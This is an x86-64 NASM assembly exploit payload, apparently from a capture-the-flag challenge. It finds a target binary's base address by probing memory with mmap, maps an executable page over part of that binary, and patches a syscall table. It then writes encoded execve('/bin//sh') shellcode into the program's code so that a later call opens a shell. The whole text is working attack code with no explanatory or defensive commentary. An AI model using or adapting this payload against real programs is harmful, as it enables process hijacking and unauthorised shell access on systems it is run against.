BITS 64
ORG 0

; rdi, rsi, rdx, r10, r8, r9
mov rbx, 0x0000550000000000
mov rcx,       0x1000000000

map:
cmp rcx, 0x1000
jl probe_done

# probe using MAP_FIXED_NOREPLACE
mov rdi, rbx
mov rsi, rcx
mov rdx, 0
mov r10, 0x100022
mov r8d, -1
xor r9, r9
mov eax, 9
syscall

cmp rax, 0
jne hit     ; rax != 0 => rax == -1

mov rdi, rbx
mov rsi, rcx
mov eax, 11
syscall
add rbx, rcx

jmp map


hit:
shr rcx, 1
jmp map


probe_done:
# mmap over binary base + 0x2000
mov rdi, rbx
add rdi, 0x2000
mov rsi, 0x1000
mov rdx, 7
mov r10, 0x32
mov r8d, -1
xor r9, r9
mov eax, 9
syscall


# fix syscall_abi (for vfprintf)
mov rdi, rbx
add rdi, 0x21F0
mov byte [rdi], 0x23
mov byte [rdi + 4], 0x27
mov byte [rdi + 8], 0x2b
mov byte [rdi + 12], 0x28
mov byte [rdi + 16], 0x6c
mov byte [rdi + 20], 0x6a
mov byte [rdi + 24], 0x6b


# write shellcode at std::hex
mov rdi, rbx
add rdi, 0x2124
mov rax, 0x6e69622fbb48f631
mov qword [rdi], rax
mov rax, 0x5f54535668732f2f
mov qword [rdi + 8], rax
mov rax, 0x90050fd231583b6a
mov qword [rdi + 16], rax


mov eax, 60
syscall
